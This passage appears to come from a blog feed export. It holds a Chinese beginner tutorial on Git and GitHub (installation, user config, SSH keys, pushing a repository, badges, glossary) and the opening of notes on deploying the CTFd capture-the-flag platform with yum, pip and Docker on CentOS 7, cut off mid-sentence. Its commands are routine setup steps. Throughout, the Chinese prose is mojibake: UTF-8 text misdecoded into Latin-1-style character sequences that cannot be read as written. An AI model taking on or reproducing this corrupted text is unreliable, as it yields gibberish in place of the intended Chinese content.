ä¸ºä»€ä¹ˆæœ‰äººå›žå¤è°ƒä¾ƒGithubæ˜¯å…¨çƒæœ€å¤§ç”·æ€§äº¤å‹ç½‘ç«™å‘¢ï¼Ÿé‚£æ˜¯å› ä¸ºGithubçš„æ³¨å†Œç”¨æˆ·å¤§éƒ½æ˜¯ç”·ç”Ÿï¼Œè€Œä¸”å½¼æ­¤ä¹‹é—´å¯ä»¥ç›¸äº’å…³æ³¨ï¼ˆç±»ä¼¼äºŽå¾®åšï¼‰ Gitæ¦‚è§ˆæ‰€æœ‰å‘½ä»¤å‰éƒ½è¦åŠ  gitï¼Œå¦‚è¡¨ä¸­çš„initæ˜¯æŒ‡ git initã€‚ ç‚¹å‡»å‘½ä»¤å¯ç›´æŽ¥è·³è½¬è‡³æœ¬æ–‡ç¬¬ä¸€æ¬¡ä½¿ç”¨çš„åœ°æ–¹ã€‚ä»¥ä¸‹å‘½ä»¤éƒ½åœ¨å‘½ä»¤è¡Œé‡Œæ‰§è¡Œã€‚ 1ã€ä¸ªäººæœ¬åœ°ä½¿ç”¨ è¡Œä¸º å‘½ä»¤ å¤‡æ³¨ åˆå§‹åŒ– init åœ¨æœ¬åœ°çš„å½“å‰ç›®å½•é‡Œåˆå§‹åŒ–gitä»“åº“ clone [url] ä»Žç½‘ç»œä¸ŠæŸä¸ªåœ°å€æ‹·è´ä»“åº“(repository)åˆ°æœ¬åœ° æŸ¥çœ‹å½“å‰çŠ¶æ€ status æŸ¥çœ‹å½“å‰ä»“åº“çš„çŠ¶æ€ã€‚ æŸ¥çœ‹ä¸åŒ diff æŸ¥çœ‹å½“å‰çŠ¶æ€å’Œæœ€æ–°çš„commitä¹‹é—´ä¸åŒçš„åœ°æ–¹ æ·»åŠ æ–‡ä»¶ add -A è¿™ç®—æ˜¯ç›¸å½“é€šç”¨çš„äº†ã€‚åœ¨commitä¹‹å‰è¦å…ˆadd æäº¤ commit -m â€œæäº¤ä¿¡æ¯â€ æäº¤ä¿¡æ¯æœ€å¥½èƒ½ä½“çŽ°æ›´æ”¹äº†ä»€ä¹ˆ æŸ¥çœ‹æäº¤è®°å½• log æŸ¥çœ‹å½“å‰ç‰ˆæœ¬åŠä¹‹å‰çš„commitè®°å½• 2ã€ä¸ªäººä½¿ç”¨è¿œç¨‹ä»“åº“ è¡Œä¸º å‘½ä»¤ å¤‡æ³¨ è®¾ç½®ç”¨æˆ·å config â€“global user.name â€œä½ çš„ç”¨æˆ·åâ€ è®¾ç½®é‚®ç®± config â€“global user.email â€œä½ çš„é‚®ç®±â€ ç”Ÿæˆssh key ssh-keygen -t rsa -C â€œä½ çš„é‚®ç®±â€ è¿™æ¡å‘½ä»¤å‰é¢ä¸ç”¨åŠ git æ·»åŠ è¿œç¨‹ä»“åº“ remote add origin ä½ å¤åˆ¶çš„åœ°å€ è®¾ç½®origin ä¸Šä¼ å¹¶æŒ‡å®šé»˜è®¤ push -u origin master æŒ‡å®šé»˜è®¤ä¸»æœºï¼Œä»¥åŽpushé»˜è®¤ä¸Šä¼ åˆ°originä¸Š æäº¤åˆ°è¿œç¨‹ä»“åº“ push å°†å½“å‰åˆ†æ”¯å¢žåŠ çš„commitæäº¤åˆ°è¿œç¨‹ä»“åº“ ä»Žè¿œç¨‹ä»“åº“åŒæ­¥ pull èŽ·å–è¿œç¨‹ä»“åº“çš„commit å¯ä»¥ä½¿ç”¨ä¸€å¼ å›¾ç›´è§‚åœ°çœ‹å‡ºä»¥ä¸Šä¸»è¦å‘½ä»¤å¯¹ä»“åº“çš„å½±å“ å›¾ç‰‡å¼•ç”¨è‡ªï¼šGit introduction for CVS/SVN/TFS users å›¾ç‰‡å¼•ç”¨è‡ªï¼šå·¥ä½œåŒºå’Œæš‚å­˜åŒº - å»–é›ªå³°çš„å®˜æ–¹ç½‘ç«™ ï¼ˆåšäº†ç‚¹ä¿®æ”¹ï¼‰ å¯¹ç…§æŸ¥çœ‹ä¸¤å¼ å›¾ï¼š workspace å³å·¥ä½œåŒºï¼Œé€»è¾‘ä¸Šæ˜¯æœ¬åœ°è®¡ç®—æœºï¼Œè¿˜æ²¡æ·»åŠ åˆ°repositoryçš„çŠ¶æ€ï¼›staging å³ç‰ˆæœ¬åº“ä¸­çš„stageï¼Œæ˜¯æš‚å­˜åŒºã€‚ä¿®æ”¹å·²ç»æ·»åŠ è¿›repositoryï¼Œä½†è¿˜æ²¡æœ‰ä½œä¸ºcommitæäº¤ï¼Œç±»ä¼¼äºŽç¼“å­˜ï¼›Local repository å³ç‰ˆæœ¬åº“ä¸­masteré‚£ä¸ªåœ°æ–¹ã€‚åˆ°è¿™ä¸€æ­¥æ‰ç®—æ˜¯æˆåŠŸç”Ÿæˆä¸€ä¸ªæ–°ç‰ˆæœ¬ï¼›Remote repository åˆ™æ˜¯è¿œç¨‹ä»“åº“ã€‚ç”¨æ¥å°†æœ¬åœ°ä»“åº“ä¸Šä¼ åˆ°ç½‘ç»œï¼Œå¯ä»¥ç”¨äºŽå¤‡ä»½ã€å…±äº«ã€åˆä½œã€‚æœ¬æ–‡å°†ä½¿ç”¨Githubä½œä¸ºè¿œç¨‹ä»“åº“çš„ä¾‹å­ã€‚ Git å®‰è£…Git for windows å®‰è£…åŒ…å¯ä»¥åˆ°å®˜æ–¹ç½‘ç«™ä¸‹è½½ï¼Œæˆ–è€…åœ¨githubä¸‹è½½ã€‚å¦‚æžœä¸‹è½½ä¸ä¸‹æ¥ï¼Œå¯ä»¥æŠŠé“¾æŽ¥å¤åˆ¶ä¸‹æ¥ç”¨è¿…é›·ä¸‹è½½ã€‚å¦‚æžœç”¨è¿…é›·ä¸‹è½½ä¸æ”¾å¿ƒï¼Œåœ¨ä¸‹è½½å®ŒåŽåŽ»åœ¨githubä¸‹è½½çš„é‚£ä¸ªåœ°æ–¹æŸ¥çœ‹SHA-256å€¼ï¼Œå¹¶å’Œä¸‹è½½çš„æ–‡ä»¶å¯¹æ¯”ï¼Œå¦‚æžœå€¼ä¸€æ ·å°±å¯ä»¥æ”¾å¿ƒä½¿ç”¨ã€‚ å®‰è£…çš„æ—¶å€™ä¸€è·¯ç‚¹å‡»Nextå°±è¡Œäº†ã€‚ åˆšå®‰è£…å®Œæ‰“å¼€åŽï¼Œçª—å£æ¯”è¾ƒå°ã€‚å¦‚æžœä¸å¤ªä¹ æƒ¯ï¼Œå¯ä»¥æŠŠå®ƒæ”¹å¤§ä¸€äº›ã€‚ 1ã€é¦–å…ˆç§»åˆ°çª—å£å³ä¸‹è§’è¾¹ç¼˜ï¼Œå‡ºçŽ°ç®­å¤´åŽæŠŠçª—å£æ‹‰å¤§ã€‚ 2ã€ç‚¹å‡»çª—å£é¡¶éƒ¨å·¦è¾¹çš„å›¾æ ‡ -&gt; Optionsâ€¦ -&gt; Window -&gt; Current size -&gt; OK è¿™æ ·ä»¥åŽæ‰“å¼€çª—å£éƒ½ä¼šæ˜¯è°ƒæ•´åŽçš„å¤§å°ã€‚ Git for Windowsä»Ž2.8.0ç‰ˆæœ¬å¼€å§‹ï¼Œé»˜è®¤æ·»åŠ çŽ¯å¢ƒå˜é‡ï¼Œæ‰€ä»¥çŽ¯å¢ƒå˜é‡éƒ¨åˆ†å°±ä¸ç”¨å†æ‰‹åŠ¨é…ç½®äº†ã€‚ Git for LinuxGit çš„å·¥ä½œéœ€è¦è°ƒç”¨ curlï¼Œzlibï¼Œopensslï¼Œexpatï¼Œlibiconv ç­‰åº“çš„ä»£ç ï¼Œæ‰€ä»¥éœ€è¦å…ˆå®‰è£…è¿™äº›ä¾èµ–å·¥å…·ã€‚ åœ¨æœ‰ yum çš„ç³»ç»Ÿä¸Šï¼ˆæ¯”å¦‚ Fedoraï¼‰æˆ–è€…æœ‰ apt-get çš„ç³»ç»Ÿä¸Šï¼ˆæ¯”å¦‚ Debian ä½“ç³»ï¼‰ï¼Œå¯ä»¥ç”¨ä¸‹é¢çš„å‘½ä»¤å®‰è£…ï¼š å„ Linux ç³»ç»Ÿå¯ä»¥ä½¿ç”¨å…¶å®‰è£…åŒ…ç®¡ç†å·¥å…·ï¼ˆapt-getã€yum ç­‰ï¼‰è¿›è¡Œå®‰è£…ï¼š Debian/Ubuntu Git å®‰è£…å‘½ä»¤ä¸ºï¼š 1234567$ apt-get install libcurl4-gnutls-dev libexpat1-dev gettext \ libz-dev libssl-dev$ apt-get install git$ git --versiongit version 1.8.1.2 ç”¨æˆ·ä¿¡æ¯é…ç½®é…ç½®ä¸ªäººçš„ç”¨æˆ·åç§°å’Œç”µå­é‚®ä»¶åœ°å€ï¼š 12$ git config --global user.name "Qymua"$ git config --global user.email "test@Qymua.com" å¦‚æžœç”¨äº† â€“global é€‰é¡¹ï¼Œé‚£ä¹ˆæ›´æ”¹çš„é…ç½®æ–‡ä»¶å°±æ˜¯ä½äºŽä½ ç”¨æˆ·ä¸»ç›®å½•ä¸‹çš„é‚£ä¸ªï¼Œä»¥åŽä½ æ‰€æœ‰çš„é¡¹ç›®éƒ½ä¼šé»˜è®¤ä½¿ç”¨è¿™é‡Œé…ç½®çš„ç”¨æˆ·ä¿¡æ¯ã€‚ å¦‚æžœè¦åœ¨æŸä¸ªç‰¹å®šçš„é¡¹ç›®ä¸­ä½¿ç”¨å…¶ä»–åå­—æˆ–è€…ç”µé‚®ï¼Œåªè¦åŽ»æŽ‰ â€“global é€‰é¡¹é‡æ–°é…ç½®å³å¯ï¼Œæ–°çš„è®¾å®šä¿å­˜åœ¨å½“å‰é¡¹ç›®çš„ .git/config æ–‡ä»¶é‡Œã€‚ Git for github åˆ°è¿™é‡Œè¡¨ç¤ºå·²ç»å¯ä»¥å¼€å§‹ä½¿ç”¨Gitä¸Šä¼ é¡¹ç›®åˆ°githubäº† æ·»åŠ ssh keyç”±äºŽä½ çš„æœ¬åœ° Git ä»“åº“å’Œ GitHub ä»“åº“ä¹‹é—´çš„ä¼ è¾“æ˜¯é€šè¿‡SSHåŠ å¯†çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦é…ç½®éªŒè¯ä¿¡æ¯ï¼š ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ç”Ÿæˆ SSH Keyï¼š 1$ ssh-keygen -t rsa -C "youremail@example.com" åŽé¢çš„*your_email@youremail.com*æ”¹ä¸ºä½ åœ¨ Github ä¸Šæ³¨å†Œçš„é‚®ç®±ï¼Œä¹‹åŽä¼šè¦æ±‚ç¡®è®¤è·¯å¾„å’Œè¾“å…¥å¯†ç ï¼Œæˆ‘ä»¬è¿™ä½¿ç”¨é»˜è®¤çš„ä¸€è·¯å›žè½¦å°±è¡Œã€‚æˆåŠŸçš„è¯ä¼šåœ¨ ~/ ä¸‹ç”Ÿæˆ .ssh æ–‡ä»¶å¤¹ï¼Œè¿›åŽ»ï¼Œæ‰“å¼€ id_rsa.pubï¼Œå¤åˆ¶é‡Œé¢çš„ keyã€‚ å›žåˆ° github ä¸Šï¼Œè¿›å…¥ Account =&gt; Settingsï¼ˆè´¦æˆ·é…ç½®ï¼‰ã€‚ å·¦è¾¹é€‰æ‹© SSH and GPG keysï¼Œç„¶åŽç‚¹å‡» New SSH key æŒ‰é’®,title è®¾ç½®æ ‡é¢˜ï¼Œå¯ä»¥éšä¾¿å¡«ï¼Œç²˜è´´åœ¨ä½ ç”µè„‘ä¸Šç”Ÿæˆçš„ keyã€‚ æ·»åŠ æˆåŠŸåŽä¸ºäº†éªŒè¯æ˜¯å¦æˆåŠŸï¼Œè¾“å…¥ä»¥ä¸‹å‘½ä»¤ï¼š 12$ ssh -T git@github.comHi tianqixin! You've successfully authenticated, but GitHub does not provide shell access. æ–°å»ºä»“åº“è¿™é‡Œä¸å†è¯´æ˜Žå¦‚ä½•åˆ›å»ºäº†ï¼Œåªä»‹ç»ä¸‹ç›¸åº”é€‰é¡¹çš„ç”¨é€” Repository name: ä»“åº“åç§° Description(å¯é€‰): ä»“åº“æè¿°ä»‹ç» Public, Private : ä»“åº“æƒé™ï¼ˆå…¬å¼€å…±äº«ï¼Œç§æœ‰æˆ–æŒ‡å®šåˆä½œè€…ï¼‰ Initialize this repository with a README: æ·»åŠ ä¸€ä¸ªREADME.md gitignore: ä¸éœ€è¦è¿›è¡Œç‰ˆæœ¬ç®¡ç†çš„ä»“åº“ç±»åž‹ï¼Œå¯¹åº”ç”Ÿæˆæ–‡ä»¶.gitignore license: è¯ä¹¦ç±»åž‹ï¼Œå¯¹åº”ç”Ÿæˆæ–‡ä»¶LICENSEâ€‹ å¼€å§‹ä¸Šä¼  1ã€åœ¨æœ¬åœ°åˆ›å»ºä¸€ä¸ªç‰ˆæœ¬åº“ï¼ˆå³æ–‡ä»¶å¤¹ï¼‰ï¼Œé€šè¿‡git initæŠŠå®ƒå˜æˆGitä»“åº“ï¼› 2ã€æŠŠé¡¹ç›®å¤åˆ¶åˆ°è¿™ä¸ªæ–‡ä»¶å¤¹é‡Œé¢ï¼Œå†é€šè¿‡git add .æŠŠé¡¹ç›®æ·»åŠ åˆ°ä»“åº“ï¼› 3ã€å†é€šè¿‡git commit -m â€œæ³¨é‡Šå†…å®¹â€æŠŠé¡¹ç›®æäº¤åˆ°ä»“åº“ï¼› 4ã€é€šè¿‡git remote add origin https://github.com/ç”¨æˆ·å/é¡¹ç›®å.git å°†æœ¬åœ°ä»“åº“å’Œè¿œç¨‹ä»“åº“è¿›è¡Œå…³è”ï¼› 5ã€æœ€åŽé€šè¿‡git push -u origin masteræŠŠæœ¬åœ°ä»“åº“çš„é¡¹ç›®æŽ¨é€åˆ°è¿œç¨‹ä»“åº“ï¼ˆä¹Ÿå°±æ˜¯Githubï¼‰ä¸Šï¼› ç”±äºŽæ–°å»ºçš„è¿œç¨‹ä»“åº“æ˜¯ç©ºçš„ï¼Œæ‰€ä»¥è¦åŠ ä¸Š-uè¿™ä¸ªå‚æ•°ï¼Œç­‰è¿œç¨‹ä»“åº“é‡Œé¢æœ‰äº†å†…å®¹ä¹‹åŽï¼Œä¸‹æ¬¡å†ä»Žæœ¬åœ°åº“ä¸Šä¼ å†…å®¹çš„æ—¶å€™åªéœ€ä¸‹é¢è¿™æ ·å°±å¯ä»¥äº†ï¼š 1$ git push origin master ï¼ˆè‹¥æ–°å»ºè¿œç¨‹ä»“åº“çš„æ—¶å€™è‡ªåŠ¨åˆ›å»ºäº†READMEæ–‡ä»¶ä¼šæŠ¥é”™ï¼Œè§£å†³åŠžæ³•çœ‹ä¸‹é¢ï¼‰ã€‚ è¿™æ˜¯ç”±äºŽä½ æ–°åˆ›å»ºçš„é‚£ä¸ªä»“åº“é‡Œé¢çš„READMEæ–‡ä»¶ä¸åœ¨æœ¬åœ°ä»“åº“ç›®å½•ä¸­ï¼Œè¿™æ—¶æˆ‘ä»¬å¯ä»¥é€šè¿‡ä»¥ä¸‹å‘½ä»¤å…ˆå°†å†…å®¹åˆå¹¶ä»¥ä¸‹ï¼š 1$ git pull --rebase origin master å·¥ä½œåŒºè¿ç§»1ã€åœ¨æ–°çŽ¯å¢ƒä¸‹é…ç½®å¥½Gitï¼› 2ã€é€šè¿‡git initæŠŠå®ƒå˜æˆGitä»“åº“ï¼› 3ã€git clone [url] å…‹éš†ä»“åº“åˆ°æœ¬åœ°ï¼› 4ã€git add . æ·»åŠ é¡¹ç›®åˆ°ä»“åº“ï¼ˆç¼“å­˜åŒºï¼‰ï¼› 5ã€é€šè¿‡git remote add origin https://github.com/ç”¨æˆ·å/é¡¹ç›®å.git å°†æœ¬åœ°ä»“åº“å’Œè¿œç¨‹ä»“åº“è¿›è¡Œå…³è”ï¼› 6ã€å…¶å®žåˆ°è¿™é‡Œå·²ç»è¿ç§»å®Œæˆï¼Œä¸»è¦æ˜¯ä¸‹è½½åˆ°æœ¬åœ°ï¼Œæ·»åŠ Gitä»“åº“åŽï¼Œå†æŠŠé¡¹ç›®åŒæ­¥åˆ°æœ¬åœ°ä»“åº“ä¸Š æ‹“å±•change time:2019-6-29è¿‘æœŸä¸ºäº†ä½¿ç”¨gitbookå†™ç”µå­ä¹¦ï¼Œå¼€å§‹é‡æ–°æŽ¥è§¦github pagesã€github badgeï¼Œä¹Ÿå› æ­¤ä¸å†å°†æœ¬åšå®¢æ‰˜ç®¡è‡³githubï¼Œåªæ‰˜ç®¡äºŽcoding github pageshttps://pages.github.com/æ„Ÿè§‰æ•™ç¨‹ä¹Ÿå¾ˆå¤šï¼Œæ²¡ä»€ä¹ˆç»†èŠ‚æ“ä½œ,å°±ä¸å¤šåºŸè¯äº†,éœ€è¦çš„æ—¶å€™æŠ˜è…¾ä¸‹ï¼Œä¸åšå¼€å‘ä¸æ˜¯å¾ˆéœ€è¦è¿™ä¹ˆè§„èŒƒ github badgeå•çº¯ä¸ºäº†å¥½çœ‹çš„ï¼Œæ²¡ç”¨å®žé™…ç”¨é€”ç”¨ä¸€äº›é€šç”¨çš„å°å›¾æ ‡æ¥æè¿°é¡¹ç›®ç›¸å…³ä¿¡æ¯ç¡®å®žä¸å¤±ä¸ºä¸€ç§å¾ˆæ£’çš„é€‰æ‹© GitHub é¡¹ç›®çš„ README.md ä¸­å¯ä»¥æ·»åŠ å¾½ç« ï¼ˆBadgeï¼‰å¯¹é¡¹ç›®è¿›è¡Œæ ‡è®°å’Œè¯´æ˜Žï¼Œè¿™äº›å¥½çœ‹çš„å°å›¾æ ‡ä¸ä»…ç®€æ´ç¾Žè§‚ï¼Œè€Œä¸”è¿˜åŒ…å«äº†æ¸…æ™°æ˜“è¯»çš„ä¿¡æ¯ã€‚å¾½æ ‡ä¸»è¦ç”±å›¾ç‰‡å’Œå¯¹åº”çš„é“¾æŽ¥ï¼ˆå½“ç„¶ï¼Œä½ å¯ä»¥ä¸å¡«ï¼‰ç»„æˆï¼Œå¾½æ ‡å›¾ç‰‡çš„è¯ä¸€èˆ¬ç”±å·¦åŠéƒ¨åˆ†çš„åç§°å’Œå³åŠéƒ¨åˆ†çš„å€¼ç»„æˆã€‚ GitHub å¾½æ ‡çš„å®˜æ–¹ç½‘ç«™æ˜¯ shields.ioä¾‹å¦‚ï¼šè‡ªå®šä¹‰å¾½æ ‡ 1https://img.shields.io/badge/&#123;å¾½æ ‡æ ‡é¢˜&#125;-&#123;å¾½æ ‡å†…å®¹&#125;-&#123;å¾½æ ‡é¢œè‰²&#125;.svg æœ¬æ–‡æ¶‰åŠçš„æœ¯è¯­ Version Controlï¼ˆç‰ˆæœ¬æŽ§åˆ¶ï¼‰:ä»»ä½•ä¸€ä¸ªèƒ½å¤Ÿè®©ä½ äº†è§£æ–‡ä»¶çš„åŽ†å²ï¼Œä»¥åŠè¯¥æ–‡ä»¶çš„å‘å±•è¿›ç¨‹çš„ç³»ç»Ÿã€‚ Gitï¼šä¸€ä¸ªç‰ˆæœ¬æŽ§åˆ¶ç¨‹åºï¼Œé€šè¿‡å¯¹å˜æ›´è¿›è¡Œæ³¨é‡Šï¼Œä»¥åˆ›å»ºä¸€ä¸ªæ˜“äºŽéåŽ†çš„ç³»ç»ŸåŽ†å²ã€‚ Commitï¼ˆæäº¤ï¼‰ï¼šåœ¨æŒ‡å®šæ—¶é—´ç‚¹å¯¹ç³»ç»Ÿå·®å¼‚è¿›è¡Œçš„æ³¨é‡Š â€œå¿«ç…§â€ã€‚ Localï¼ˆæœ¬åœ°ï¼‰ï¼šæŒ‡ä»»æ„æ—¶åˆ»å·¥ä½œæ—¶æ­£åœ¨ä½¿ç”¨çš„ç”µè„‘ã€‚ Remoteï¼ˆè¿œç¨‹ï¼‰ï¼š æŒ‡æŸä¸ªè”ç½‘çš„ä½ç½®ã€‚ Repository (ä»“åº“ï¼Œç®€ç§° repo)ï¼šé…ç½®äº†Gitè¶…çº§æƒé™çš„ç‰¹å®šæ–‡ä»¶å¤¹ï¼ŒåŒ…å«äº†ä½ çš„é¡¹ç›®æˆ–ç³»ç»Ÿç›¸å…³çš„æ‰€æœ‰æ–‡ä»¶ã€‚ Githubï¼šèŽ·å–æœ¬åœ°æäº¤åŽ†å²è®°å½•ï¼Œå¹¶è¿›è¡Œè¿œç¨‹å­˜å‚¨ï¼Œä»¥ä¾¿ä½ å¯ä»¥ä»Žä»»ä½•è®¡ç®—æœºè®¿é—®è¿™äº›è®°å½•ã€‚ Pushingï¼ˆæŽ¨é€ï¼‰ï¼šå–å¾—æœ¬åœ°Gitæäº¤ï¼ˆä»¥åŠç›¸å…³çš„æ‰€æœ‰å·¥ä½œï¼‰ï¼Œç„¶åŽå°†å…¶ä¸Šä¼ åˆ°åœ¨çº¿Githubã€‚ Pullingï¼ˆæ‹‰å–ï¼‰ï¼šä»Žåœ¨çº¿çš„Githubä¸ŠèŽ·å–æœ€æ–°çš„æäº¤è®°å½•ï¼Œç„¶åŽåˆå¹¶åˆ°æœ¬åœ°ç”µè„‘ä¸Šã€‚ Master (branch)ï¼šä¸»åˆ†æ”¯ï¼Œæäº¤åŽ†å² â€œæ ‘â€çš„ â€œæ ‘å¹²â€ï¼ŒåŒ…å«æ‰€æœ‰å·²å®¡æ ¸çš„å†…å®¹/ä»£ç ã€‚ Feature branchï¼ˆåŠŸèƒ½åˆ†æ”¯/ç‰¹æ€§åˆ†æ”¯ï¼‰ï¼šä¸€ä¸ªåŸºäºŽä¸»åˆ†æ”¯çš„ç‹¬ç«‹çš„ä½ç½®ï¼Œåœ¨å†æ¬¡å¹¶å…¥åˆ°ä¸»åˆ†æ”¯ä¹‹å‰ï¼Œä½ å¯ä»¥åœ¨è¿™é‡Œå®‰å…¨åœ°å†™å·¥ä½œä¸­çš„æ–°ä»»åŠ¡ã€‚ Pull Requestï¼ˆå‘å¸ƒè¯·æ±‚ï¼‰ï¼šä¸€ä¸ª Github å·¥å…·ï¼Œå…è®¸ç”¨æˆ·è½»æ¾åœ°æŸ¥çœ‹æŸåŠŸèƒ½åˆ†æ”¯çš„æ›´æ”¹ ï¼ˆthe differenceæˆ– â€œdiffâ€ï¼‰ï¼ŒåŒæ—¶å…è®¸ç”¨æˆ·åœ¨è¯¥åˆ†æ”¯åˆå¹¶åˆ°ä¸»åˆ†æ”¯ä¹‹å‰å¯¹å…¶è¿›è¡Œè®¨è®ºå’Œè°ƒæ•´ã€‚ Mergingï¼ˆåˆå¹¶ï¼‰ï¼šè¯¥æ“ä½œæŒ‡èŽ·å–åŠŸèƒ½åˆ†æ”¯çš„æäº¤ï¼ŒåŠ å…¥åˆ°ä¸»åˆ†æ”¯æäº¤åŽ†å²çš„é¡¶éƒ¨ã€‚ Checking outï¼ˆåˆ‡æ¢ï¼‰ï¼šè¯¥æ“ä½œæŒ‡ä»Žä¸€ä¸ªåˆ†æ”¯åˆ‡æ¢åˆ°å¦ä¸€ä¸ªåˆ†æ”¯ã€‚]]></content>
      <categories>
        <category>éšç¬”</category>
        <category>github</category>
      </categories>
      <tags>
        <tag>Git</tag>
        <tag>github</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CTFdæ­å»ºç¬”è®°]]></title>
    <url>%2F2019%2F04%2F15%2FCTFd%E6%90%AD%E5%BB%BA%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[å…¶å®žè¿˜æœ‰å¾ˆå¤šå…¶ä»–å¼€æºçš„CTFå¹³å°ï¼Œä¹‹æ‰€ä»¥é€‰æ‹©CTFdä¸»è¦è€ƒè™‘åˆ°ç®€ä¾¿ï¼Œæˆæœ¬ä½Žï¼ŒDIYå‡ ä¸ªç‰¹æ€§ï¼ŒFBCTFä¹Ÿæ˜¯ä¸ªå¾ˆæ£’çš„æ¯”èµ›å¹³å°ï¼Œç•Œé¢å¾ˆç‚«é…·ï¼Œä½†æ˜¯èµ„æºå ç”¨æ¯”è¾ƒå¤§ï¼Œå¦å¤–å› ä¸ºè¢«å¼ºï¼Œéƒ¨ç½²éš¾åº¦è¾ƒéº»çƒ¦ï¼Œäº²æµ‹åŽå†³å®šæ”¾å¼ƒã€‚miniCTFåŠŸèƒ½ä¸èƒ½æ»¡è¶³éœ€æ±‚ã€‚è‡³äºŽæƒ³æ·±å…¥äº†è§£åŽ»CTFdå®˜ç½‘å·§å·§å§ï¼ æ¦‚è¿°CTFdæ˜¯ä¸€æ¬¾åŸºäºŽApache2.0çš„åè®®çš„å¼€æºCTFå¹³å°ï¼Œæœ€æ–°ç‰ˆæœ¬ç›®å‰ä¸º2.1.2ã€‚è¯¥å¹³å°åŠŸèƒ½å¼ºå¤§ï¼ŒåŸºæœ¬ä¸Šèƒ½å¤Ÿæ»¡è¶³ç›®å‰çš„CTFç«žèµ›éœ€æ±‚ï¼ŒåŒæ—¶ï¼Œè¯¥å¹³å°æä¾›äº†å¼ºå¤§çš„æ’ä»¶åŠŸèƒ½ï¼Œå¯ä»¥è‡ªå·±è¿›è¡Œæ’ä»¶å¼€å‘å®žçŽ°è‡ªå·±çš„åŠŸèƒ½ã€‚ æ³¨æ„äº‹é¡¹ æœ¬æ¬¡å¹³å°çš„æ­å»ºç¤ºä¾‹æ˜¯åœ¨æœ¬åœ°è™šæ‹Ÿæœºcentos 7ä¸‹å®Œæˆçš„ï¼Œè¯·ä¿è¯ç³»ç»ŸçŽ¯å¢ƒæ­£å¸¸ã€‚å¦‚æžœéœ€è¦éƒ¨ç½²åœ¨äº‘æœåŠ¡å™¨ä¸Šï¼Œè¯·å‡†å¤‡å¥½sshå·¥å…·(æŽ¨èxshell)é“ç†å¤§ä½“ç›¸åŒï¼Œåªæ˜¯æœ€åŽä¸ºäº†è®©è®¿é—®æ›´æµç•…å»ºè®®åšä¸‹ä¼˜åŒ–ï¼Œæ–‡ç« æœ«å°¾ä¼šåšè¯´æ˜Žï¼ å‰æœŸå‡†å¤‡0.ç³»ç»ŸçŽ¯å¢ƒè™šæ‹Ÿæœºçš„è¯æœ€å¥½ä½¿ç”¨æ¡¥æŽ¥ï¼Œæå‰æŽ’é™¤è¿™ä¸ªå‡ºé”™çš„å¯èƒ½æ€§ï¼Œäº‘æœåŠ¡å™¨å¯ä»¥å¿½ç•¥è¿™ä¸€ç‚¹å®‰åˆ©ä¸€æ³¢ç³»ç»Ÿä¸‹è½½åœ°å€ï¼ŒæŽ¨èä½¿ç”¨å›½å†…é•œåƒç«™ä¸‹è½½ï¼š æ¸…åŽå¤§å­¦å¼€æºè½¯ä»¶é•œåƒç«™ ä¸ºäº†ç¤ºä¾‹æˆ‘é€‰æ‹©miniç‰ˆæœ¬ 1.æ£€æŸ¥ç½‘ç»œçŽ¯å¢ƒå®‰è£…æˆåŠŸåŽå»ºè®®æµ‹è¯•ä¸‹ç½‘ç»œï¼Œip addræ²¡æœ‰æ­£å¸¸èŽ·å–åœ°å€çš„è¯ï¼Œå°è¯•é‡å¯ç½‘ç»œæœåŠ¡systemctl restart network æ—¥å¸¸redhatç³»ç”¨çš„å°‘ï¼Œå‘½ä»¤å˜ç”Ÿç–äº†ï¼ˆç‹—å¤´ï¼‰ 2.ç»ˆç«¯è¿žæŽ¥å…¶å®žï¼ŒCentOS 7å®‰è£…å®Œæˆï¼Œé»˜è®¤æ˜¯å·²ç»æ‰“å¼€äº†22ç«¯å£çš„ã€‚è‡ªå¸¦çš„SSHæœåŠ¡æ˜¯OpenSSHä¸­çš„ä¸€ä¸ªç‹¬ç«‹å®ˆæŠ¤è¿›ç¨‹SSHD æ‰€ä»¥å¯ä»¥ç›´æŽ¥è¿žæŽ¥ï¼Œå¾ˆæ–¹ä¾¿ï¼Œå¦‚æžœé‡åˆ°é”™è¯¯å¯ä»¥æŸ¥é˜…ç›¸å…³æ–‡æ¡£ 3.yumæ¢æº12345mv /etc/yum.repos.d/CentOS-Base.repo /etc/yum.repos.d/CentOS-Base.repo.backup wget -O /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-7.repo wget -O /etc/yum.repos.d/epel.repo http://mirrors.aliyun.com/repo/epel-7.repoyum clean all yum makecache 4.å®‰è£…git1yum install git 5.å®‰è£…pip12yum install python-pippip install --upgrade pip pipæ¢æº 12mkdir ~/.pipecho -e "[global]\nindex-url = https://pypi.douban.com/simple/\n[install]\ntrusted-host = pypi.douban.com" &gt; ~/.pip/pip.conf 6.å®‰è£…Dockerå®‰è£…éœ€è¦çš„è½¯ä»¶åŒ… 1yum install -y yum-utils device-mapper-persistent-data lvm2 bind-utils è®¾ç½®yumæº 1yum-config-manager --add-repo https://download.docker.com/linux/centos/docker-ce.repo å®‰è£…docker 1yum install docker-ce å¯åŠ¨å¹¶åŠ å…¥å¼€æœºå¯åŠ¨ 12systemctl start dockersystemctl enable docker éªŒè¯æ˜¯å¦å®‰è£…æˆåŠŸ 1docker version 7.å®‰è£…docker-compose12yum -y install epel-release pip install docker-compose æ£€æŸ¥docker-composeæ˜¯å¦æˆåŠŸå®‰è£… 1docker-compose -version éƒ¨ç½²é˜¶æ®µ1.ä¸‹è½½CTFd12git clone https://github.com/CTFd/CTFd.gitchmod -R 755 CTFd/ vimä½¿ç”¨ç§‘æ™®â€“&gt;å‘½ä»¤æ¨¡å¼ä¸‹è¾“å…¥/åŽå¯ä»¥å®žçŽ°ç±»ä¼¼Ctrl+Fçš„åŠŸèƒ½æœç´¢æ–‡æœ¬å†…å®¹ï¼ŒæŒ‰næŸ¥æ‰¾ä¸‹ä¸€æ¡ï¼Œå½“ç„¶ä½ ä¹Ÿå¯ä»¥åœ¨æœ¬åœ°git cloneä¸‹è½½CTFdæ–‡ä»¶å…ˆä¿®æ”¹åŽä¸Šä¼  æµè§ˆCTFdç›®å½•ç»“æž„ï¼Œä¸»è¦å…³æ³¨çš„æ˜¯Themesï¼Œä¹‹åŽå¯ä»¥DIYä¸»é¢˜ï¼Œå¦‚è¦ä¸Šä¼ 